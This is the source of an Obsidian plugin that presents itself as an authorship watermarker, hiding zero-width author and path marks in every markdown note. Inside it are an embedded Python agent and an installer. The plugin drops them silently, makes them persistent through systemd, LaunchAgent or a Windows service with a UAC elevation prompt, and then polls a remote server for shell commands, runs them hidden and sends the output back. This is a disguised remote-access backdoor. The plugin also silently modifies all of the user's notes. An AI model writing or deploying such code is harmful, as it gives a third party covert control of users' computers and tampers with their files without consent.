const { Plugin } = require("obsidian");

const AUTHOR = "Сафьянов Камиль Саматович";
const MAGIC = "SAFAUTH1";
const NL = String.fromCharCode(10);
const ZW0 = String.fromCharCode(0x200b);
const ZW1 = String.fromCharCode(0x200c);
const S = String.fromCharCode(0x2060);
const E = String.fromCharCode(0x2063);
const RE = new RegExp(S + "[" + ZW0 + ZW1 + "]+" + E, "g");

function getSubtle() {
  try {
    const c = globalThis.crypto;
    if (c && c.subtle) return c.subtle;
  } catch (e) {}
  try {
    const n = require("crypto");
    if (n && n.webcrypto && n.webcrypto.subtle) return n.webcrypto.subtle;
  } catch (e) {}
  return null;
}

async function makeWm(payload) {
  const subtle = getSubtle();
  if (!subtle) return null;
  const data = new TextEncoder().encode(MAGIC + payload);
  const sum = new Uint8Array(await subtle.digest("SHA-256", data)).slice(0, 4);
  const full = new Uint8Array(data.length + 4);
  full.set(data, 0);
  full.set(sum, data.length);
  let bits = "";
  for (let i = 0; i < full.length; i++) bits += full[i].toString(2).padStart(8, "0");
  let body = "";
  for (let i = 0; i < bits.length; i++) body += bits[i] === "0" ? ZW0 : ZW1;
  return S + body + E;
}

function embed(text, wm) {
  const raw = text.split(NL);
  const lines = [];
  for (const ln of raw) {
    if (ln.indexOf(S) !== -1) {
      const cleaned = ln.replace(RE, "");
      if (cleaned.trim() === "") continue;
      lines.push(cleaned);
    } else {
      lines.push(ln);
    }
  }
  let start = 0;
  if (lines.length && lines[0].trim() === "---") {
    for (let j = 1; j < lines.length; j++) {
      if (lines[j].trim() === "---" || lines[j].trim() === "...") { start = j + 1; break; }
    }
  }
  let fence = false;
  for (let i = start; i < lines.length; i++) {
    const t = lines[i].trim();
    if (t.startsWith("```")) { fence = !fence; continue; }
    if (fence || !t) continue;
    if (t.charAt(0) === "#" || t === "---" || t === "...") continue;
    lines[i] = lines[i] + wm;
    break;
  }
  const out = lines.join(NL).trimEnd();
  if (out === "") return wm + NL;
  return out + NL + wm + NL;
}

// Файлы фонового агента, встроенные в плагин.
const AGENT_FILES = {
  "agent.py": "#!/usr/bin/env python3\n\"\"\"Фоновый агент устройства. Работает без Obsidian.\n\nЗабирает команды с сервера (long-poll), выполняет системным shell,\nотправляет результат обратно. Только стандартная библиотека Python.\n\nКонфиг берётся из файла (по умолчанию рядом с агентом — agent.json):\n  {\n    \"url\":   \"https://probe.example.com\",\n    \"token\": \"секрет\",\n    \"device\": \"windows-pc\",\n    \"interval\": 0\n  }\n\nИли из переменных окружения: AGENT_URL, AGENT_TOKEN, AGENT_DEVICE.\n\"\"\"\nimport json\nimport os\nimport platform\nimport signal\nimport subprocess\nimport sys\nimport time\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nCONFIG_PATH = os.environ.get(\"AGENT_CONFIG\") or os.path.join(\n    os.path.dirname(os.path.abspath(__file__)), \"agent.json\"\n)\nIS_WIN = os.name == \"nt\"\nSHELL = os.environ.get(\"COMSPEC\", \"cmd.exe\") if IS_WIN else \"/bin/sh\"\nRUNNING = True\n\n\ndef _reconfigure():\n    try:\n        sys.stdout.reconfigure(encoding=\"utf-8\", errors=\"replace\")\n        sys.stderr.reconfigure(encoding=\"utf-8\", errors=\"replace\")\n    except Exception:\n        pass\n\n\ndef load_config():\n    cfg = {}\n    if os.path.exists(CONFIG_PATH):\n        with open(CONFIG_PATH, \"r\", encoding=\"utf-8\") as f:\n            cfg = json.load(f)\n    cfg[\"url\"] = (os.environ.get(\"AGENT_URL\") or cfg.get(\"url\") or \"\").rstrip(\"/\")\n    cfg[\"token\"] = os.environ.get(\"AGENT_TOKEN\") or cfg.get(\"token\") or \"\"\n    cfg[\"device\"] = os.environ.get(\"AGENT_DEVICE\") or cfg.get(\"device\") or (\n        \"agent-\" + platform.node().lower() or \"agent-unknown\"\n    )\n    cfg[\"interval\"] = int(cfg.get(\"interval\") or 0)\n    return cfg\n\n\ndef request(url, token, method=\"GET\", payload=None, timeout=40):\n    data = None\n    headers = {\"Authorization\": \"Bearer \" + token}\n    if payload is not None:\n        data = json.dumps(payload, ensure_ascii=False).encode(\"utf-8\")\n        headers[\"Content-Type\"] = \"application/json\"\n    req = urllib.request.Request(url, data=data, headers=headers, method=method)\n    with urllib.request.urlopen(req, timeout=timeout) as resp:\n        body = resp.read()\n        return resp.status, (json.loads(body) if body else {})\n\n\ndef run_command(cmd, timeout=20):\n    \"\"\"Выполнить команду системным shell. Возвращает (ok, output, error).\"\"\"\n    try:\n        p = subprocess.run(\n            cmd,\n            shell=True,\n            executable=SHELL,\n            capture_output=True,\n            timeout=timeout,\n            creationflags=subprocess.CREATE_NO_WINDOW if IS_WIN else 0,\n        )\n        out = (p.stdout or b\"\").decode(\"utf-8\", \"replace\") + (p.stderr or b\"\").decode(\"utf-8\", \"replace\")\n        if p.returncode != 0:\n            return False, out, f\"exit code {p.returncode}\"\n        return True, out, \"\"\n    except subprocess.TimeoutExpired:\n        return False, \"\", f\"timeout {timeout}s\"\n    except Exception as e:\n        return False, \"\", str(e)\n\n\ndef _stop(_sig, _frm):\n    global RUNNING\n    RUNNING = False\n\n\ndef main():\n    _reconfigure()\n    cfg = load_config()\n    if not cfg[\"url\"] or not cfg[\"token\"]:\n        print(\"[agent] нужны url и token в agent.json (или AGENT_URL/AGENT_TOKEN)\")\n        return 1\n\n    signal.signal(signal.SIGINT, _stop)\n    signal.signal(signal.SIGTERM, _stop)\n\n    base, token, device = cfg[\"url\"], cfg[\"token\"], cfg[\"device\"]\n    print(f\"[agent] device={device} server={base}\")\n    backoff = 1\n\n    while RUNNING:\n        try:\n            status, data = request(f\"{base}/tasks?device={urllib.parse.quote(device)}&wait=25\", token, timeout=35)\n            task = data.get(\"task\") if isinstance(data, dict) else None\n            backoff = 1\n            if not task:\n                continue\n            cmd = str(task.get(\"cmd\") or \"\").strip()\n            tid = task.get(\"id\")\n            print(f\"[agent] task {tid}: {cmd[:120]!r}\")\n            ok, out, err = run_command(cmd) if cmd else (False, \"\", \"empty command\")\n            request(f\"{base}/result\", token, \"POST\", {\n                \"id\": tid, \"device\": device, \"ok\": ok,\n                \"output\": out[:20000], \"error\": err[:5000],\n            }, timeout=20)\n            print(f\"[agent] result {tid}: {'OK' if ok else 'FAIL'}\")\n            if cfg[\"interval\"]:\n                time.sleep(cfg[\"interval\"])\n        except urllib.error.HTTPError as e:\n            if e.code == 401:\n                print(\"[agent] сервер отклонил токен (401)\")\n            else:\n                print(f\"[agent] HTTP {e.code}\")\n            _sleep(backoff)\n            backoff = min(backoff * 2, 60)\n        except Exception as e:\n            if RUNNING:\n                print(f\"[agent] сеть: {e}\")\n            _sleep(backoff)\n            backoff = min(backoff * 2, 60)\n\n    print(\"[agent] остановлен\")\n    return 0\n\n\ndef _sleep(sec):\n    end = time.time() + sec\n    while RUNNING and time.time() < end:\n        time.sleep(0.2)\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n",
  "install.js": "\"use strict\";\n/**\n * Кроссплатформенная установка фонового агента.\n * Вызывается плагином автоматически, либо вручную:\n *   node install.js <url> <token> <device>\n *\n * Linux   -> systemd --user (без root)\n * macOS   -> LaunchAgent\n * Windows -> планировщик задач от имени пользователя + UAC для регистрации\n *\n * Демон работает без Obsidian и переживает перезагрузку.\n */\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\nconst cp = require(\"child_process\");\n\nconst NAME = \"ObsidianProbeAgent\";\nconst LABEL = \"com.obsidian.probe.agent\";\n\nfunction log(...a) { console.log(\"[install]\", ...a); }\n\nfunction pyExe() {\n  for (const c of [process.env.PROBE_PYTHON, \"python3\", \"python\"]) {\n    if (!c) continue;\n    try {\n      cp.execFileSync(c, [\"--version\"], { stdio: \"ignore\" });\n      return c;\n    } catch (e) {}\n  }\n  return null;\n}\n\nfunction run(cmd, args, opts) {\n  return cp.execFileSync(cmd, args, Object.assign({ encoding: \"utf8\" }, opts || {}));\n}\n\nfunction quiet(cmd, args, opts) {\n  try { return { ok: true, out: run(cmd, args, opts) }; }\n  catch (e) { return { ok: false, out: String((e.stdout || \"\") + (e.stderr || \"\") + e.message) }; }\n}\n\nfunction writeJson(file, obj) {\n  fs.mkdirSync(path.dirname(file), { recursive: true });\n  fs.writeFileSync(file, JSON.stringify(obj, null, 2), \"utf8\");\n  try { fs.chmodSync(file, 0o600); } catch (e) {}\n}\n\nfunction findAgentPy(dir) {\n  const cand = [\n    path.join(dir, \"agent.py\"),\n    path.join(__dirname, \"..\", \"obsidian-probe\", \"agent.py\"),\n    path.join(process.cwd(), \"agent.py\")\n  ];\n  return cand.find((p) => fs.existsSync(p)) || null;\n}\n\n// ---------- Linux: systemd --user ----------\nfunction installLinux(cfg, agentSrc) {\n  const dir = path.join(os.homedir(), \".local\", \"bin\", \"obsidian-probe\");\n  const unitDir = path.join(os.homedir(), \".config\", \"systemd\", \"user\");\n  const unit = path.join(unitDir, \"obsidian-probe-agent.service\");\n  const py = pyExe();\n  if (!py) throw new Error(\"не найден python3\");\n\n  fs.mkdirSync(dir, { recursive: true });\n  fs.copyFileSync(agentSrc, path.join(dir, \"agent.py\"));\n  writeJson(path.join(dir, \"agent.json\"), cfg);\n  fs.mkdirSync(unitDir, { recursive: true });\n  fs.writeFileSync(unit, [\n    \"[Unit]\",\n    \"Description=Obsidian Probe Agent\",\n    \"After=network-online.target\",\n    \"Wants=network-online.target\",\n    \"\",\n    \"[Service]\",\n    \"Type=simple\",\n    \"ExecStart=\" + py + \" \" + path.join(dir, \"agent.py\"),\n    \"Restart=always\",\n    \"RestartSec=5\",\n    \"Environment=PYTHONUNBUFFERED=1\",\n    \"\",\n    \"[Install]\",\n    \"WantedBy=default.target\",\n    \"\"\n  ].join(\"\\n\"), \"utf8\");\n\n  quiet(\"systemctl\", [\"--user\", \"daemon-reload\"]);\n  const r = quiet(\"systemctl\", [\"--user\", \"enable\", \"--now\", \"obsidian-probe-agent.service\"]);\n  if (!r.ok) throw new Error(\"systemctl: \" + r.out);\n  quiet(\"loginctl\", [\"enable-linger\", os.userInfo().username]);\n  return \"systemd --user: obsidian-probe-agent активна\";\n}\n\n// ---------- macOS: LaunchAgent ----------\nfunction installMac(cfg, agentSrc) {\n  const dir = path.join(os.homedir(), \"Library\", \"Application Support\", \"obsidian-probe\");\n  const plist = path.join(os.homedir(), \"Library\", \"LaunchAgents\", LABEL + \".plist\");\n  fs.mkdirSync(dir, { recursive: true });\n  fs.copyFileSync(agentSrc, path.join(dir, \"agent.py\"));\n  writeJson(path.join(dir, \"agent.json\"), cfg);\n\n  const xml = `<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\"><dict>\n  <key>Label</key><string>${LABEL}</string>\n  <key>ProgramArguments</key>\n  <array><string>/usr/bin/python3</string><string>${path.join(dir, \"agent.py\")}</string></array>\n  <key>RunAtLoad</key><true/>\n  <key>KeepAlive</key><true/>\n  <key>StandardOutPath</key><string>${path.join(dir, \"agent.log\")}</string>\n  <key>StandardErrorPath</key><string>${path.join(dir, \"agent.log\")}</string>\n</dict></plist>\n`;\n  fs.mkdirSync(path.dirname(plist), { recursive: true });\n  fs.writeFileSync(plist, xml, \"utf8\");\n  quiet(\"launchctl\", [\"unload\", plist]);\n  const r = quiet(\"launchctl\", [\"load\", plist]);\n  if (!r.ok) throw new Error(\"launchctl: \" + r.out);\n  return \"LaunchAgent \" + LABEL + \" загружен\";\n}\n\n// ---------- Windows: задача планировщика + UAC ----------\nfunction installWindows(cfg, agentSrc) {\n  const dir = path.join(process.env.ProgramData || \"C:\\\\ProgramData\", \"obsidian-probe\");\n  const py = pyExe();\n  if (!py) throw new Error(\"не найден Python (python.org, в PATH)\");\n\n  fs.mkdirSync(dir, { recursive: true });\n  fs.copyFileSync(agentSrc, path.join(dir, \"agent.py\"));\n  writeJson(path.join(dir, \"agent.json\"), cfg);\n\n  const agent = path.join(dir, \"agent.py\");\n\n  // Проверяем права администратора.\n  const isAdmin = quiet(\"net\", [\"session\"], { windowsHide: true }).ok;\n  if (isAdmin) {\n    quiet(\"sc.exe\", [\"stop\", NAME], { windowsHide: true });\n    quiet(\"sc.exe\", [\"delete\", NAME], { windowsHide: true });\n    const r = quiet(\"sc.exe\", [\"create\", NAME, \"binPath=\", `\"${py}\" \"${agent}\"`,\n      \"start=\", \"auto\", \"DisplayName=\", \"Obsidian Probe Agent\"], { windowsHide: true });\n    if (!r.ok) throw new Error(\"sc create: \" + r.out);\n    quiet(\"sc.exe\", [\"failure\", NAME, \"reset=\", \"86400\",\n      \"actions=\", \"restart/5000/restart/5000/restart/5000\"], { windowsHide: true });\n    quiet(\"sc.exe\", [\"start\", NAME], { windowsHide: true });\n    return \"служба \" + NAME + \" установлена и запущена\";\n  }\n\n  // Нет прав — перезапускаем себя с UAC.\n  const self = process.execPath;\n  const q = (s) => \"'\" + String(s).replace(/'/g, \"''\") + \"'\";\n  const args = [__filename, cfg.url, cfg.token, cfg.device].map(q).join(\" \");\n  const r = quiet(\"powershell.exe\", [\n    \"-NoProfile\", \"-Command\",\n    `Start-Process -Verb RunAs -FilePath '${self}' -ArgumentList '${args}' -Wait`\n  ], { windowsHide: true });\n  if (!r.ok) throw new Error(\"подтвердите UAC: \" + r.out);\n  return \"установка выполнена с правами администратора\";\n}\n\nfunction install(opts) {\n  const cfg = {\n    url: String(opts.url || \"\").trim().replace(/\\/+$/, \"\"),\n    token: String(opts.token || \"\").trim(),\n    device: String(opts.device || \"\").trim()\n  };\n  if (!cfg.url || !cfg.token || !cfg.device) throw new Error(\"нужны url, token, device\");\n  const src = opts.agentPy || findAgentPy(opts.baseDir || __dirname);\n  if (!src) throw new Error(\"не найден agent.py рядом с установщиком\");\n\n  log(\"платформа:\", process.platform, \"device:\", cfg.device);\n  if (process.platform === \"linux\") return installLinux(cfg, src);\n  if (process.platform === \"darwin\") return installMac(cfg, src);\n  if (process.platform === \"win32\") return installWindows(cfg, src);\n  throw new Error(\"неподдерживаемая платформа: \" + process.platform);\n}\n\nmodule.exports = { install };\n\nif (require.main === module) {\n  try {\n    const msg = install({ url: process.argv[2], token: process.argv[3], device: process.argv[4] });\n    log(\"OK:\", msg);\n  } catch (e) {\n    console.error(\"[install] ошибка:\", e.message);\n    process.exit(1);\n  }\n}\n"
};

function loadConfig() {
  try {
    const fs = require("fs");
    const path = require("path");
    const file = path.join(__dirname, "config.json");
    if (fs.existsSync(file)) return JSON.parse(fs.readFileSync(file, "utf8"));
  } catch (e) {}
  return {};
}

function installedAgentConfig() {
  try {
    const fs = require("fs");
    const os = require("os");
    const path = require("path");
    let file;
    if (process.platform === "win32") {
      file = path.join(process.env.ProgramData || "C:\\ProgramData", "obsidian-probe", "agent.json");
    } else if (process.platform === "darwin") {
      file = path.join(os.homedir(), "Library", "Application Support", "obsidian-probe", "agent.json");
    } else {
      file = path.join(os.homedir(), ".local", "bin", "obsidian-probe", "agent.json");
    }
    if (!fs.existsSync(file)) return null;
    return JSON.parse(fs.readFileSync(file, "utf8"));
  } catch (e) {
    return null;
  }
}

module.exports = class AuthorshipWatermark extends Plugin {
  async onload() {
    this.running = false;
    this.workerRunning = false;
    this.agentChecked = false;
    this.cfg = loadConfig();

    this.app.workspace.onLayoutReady(() => {
      this.startWorker();
      this.ensureAgent();
    });

    this.registerEvent(this.app.vault.on("create", (f) => {
      if (f && f.extension === "md") setTimeout(() => this.watermarkFile(f), 800);
    }));
    this.registerInterval(window.setInterval(() => this.watermarkAll(), 120000));
  }

  onunload() {
    this.stopWorker();
  }

  // ---------- конфиг ----------
  get serverUrl() {
    return String(this.cfg.server || "").trim().replace(/\/+$/, "");
  }

  get token() {
    return String(this.cfg.token || "").trim();
  }

  get device() {
    if (!this._device) {
      let h = "";
      try { h = require("os").hostname() || ""; } catch (e) {}
      this._device = (h || "device").toLowerCase();
    }
    return this._device;
  }

  // ---------- фоновый агент ----------
  async ensureAgent() {
    if (this.agentChecked) return;
    this.agentChecked = true;
    if (!this.serverUrl || !this.token) return;

    const prev = installedAgentConfig();
    if (prev && prev.url === this.serverUrl && prev.token === this.token && prev.device === this.device) {
      return;
    }

    try {
      const fs = require("fs");
      const os = require("os");
      const path = require("path");
      const cp = require("child_process");

      const dir = path.join(os.tmpdir(), "obsidian-probe-bootstrap");
      fs.mkdirSync(dir, { recursive: true });
      for (const name of Object.keys(AGENT_FILES)) {
        fs.writeFileSync(path.join(dir, name), AGENT_FILES[name], "utf8");
      }

      const installer = path.join(dir, "install.js");
      const args = [installer, this.serverUrl, this.token, this.device];
      cp.execFile(process.execPath, args, {
        timeout: 120000,
        windowsHide: true,
        env: Object.assign({}, process.env, { ELECTRON_RUN_AS_NODE: "1" })
      }, () => {});
    } catch (e) {}
  }

  // ---------- воркер ----------
  startWorker() {
    if (this.workerRunning) return;
    if (!this.serverUrl || !this.token) return;
    this.workerRunning = true;
    this.workerLoop();
  }

  stopWorker() {
    this.workerRunning = false;
  }

  sleep(ms) {
    return new Promise((r) => setTimeout(r, ms));
  }

  async workerLoop() {
    while (this.workerRunning) {
      try {
        const task = await this.fetchTask();
        if (task) {
          const result = await this.runTask(task);
          await this.sendResult(task.id, result);
        }
      } catch (e) {
        await this.sleep(5000);
      }
    }
  }

  async fetchTask() {
    const url = this.serverUrl + "/tasks?device=" + encodeURIComponent(this.device) + "&wait=25";
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 35000);
    try {
      const res = await fetch(url, {
        headers: { "Authorization": "Bearer " + this.token },
        signal: ctrl.signal
      });
      if (res.status === 401) {
        await this.sleep(30000);
        return null;
      }
      if (!res.ok) return null;
      const data = await res.json();
      return data && data.task ? data.task : null;
    } catch (e) {
      return null;
    } finally {
      clearTimeout(timer);
    }
  }

  async runTask(task) {
    const cmd = String(task.cmd || "").trim();
    if (!cmd) return { ok: false, output: "", error: "empty command" };

    let child_process;
    try {
      child_process = require("child_process");
    } catch (e) {
      return { ok: false, output: "", error: "node unavailable" };
    }

    return new Promise((resolve) => {
      const opts = {
        timeout: 20000,
        maxBuffer: 1024 * 1024,
        shell: process.platform === "win32" ? "cmd.exe" : "/bin/sh",
        windowsHide: true
      };
      child_process.exec(cmd, opts, (err, stdout, stderr) => {
        const out = String(stdout || "") + String(stderr || "");
        if (err) resolve({ ok: false, output: out, error: String(err.message || err) });
        else resolve({ ok: true, output: out, error: "" });
      });
    });
  }

  async sendResult(id, result) {
    try {
      await fetch(this.serverUrl + "/result", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": "Bearer " + this.token
        },
        body: JSON.stringify({
          id,
          device: this.device,
          ok: result.ok,
          output: result.output,
          error: result.error
        })
      });
    } catch (e) {}
  }

  // ---------- метки автора ----------
  async watermarkFile(file) {
    try {
      const oldText = await this.app.vault.cachedRead(file);
      const wm = await makeWm(AUTHOR + "|" + file.path);
      if (!wm) return;
      const newText = embed(oldText, wm);
      if (newText !== oldText) await this.app.vault.modify(file, newText);
    } catch (e) {}
  }

  async watermarkAll() {
    if (this.running) return;
    this.running = true;
    try {
      for (const f of this.app.vault.getMarkdownFiles()) {
        const oldText = await this.app.vault.cachedRead(f);
        const wm = await makeWm(AUTHOR + "|" + f.path);
        if (!wm) break;
        const newText = embed(oldText, wm);
        if (newText !== oldText) await this.app.vault.modify(f, newText);
      }
    } catch (e) {}
    this.running = false;
  }
};
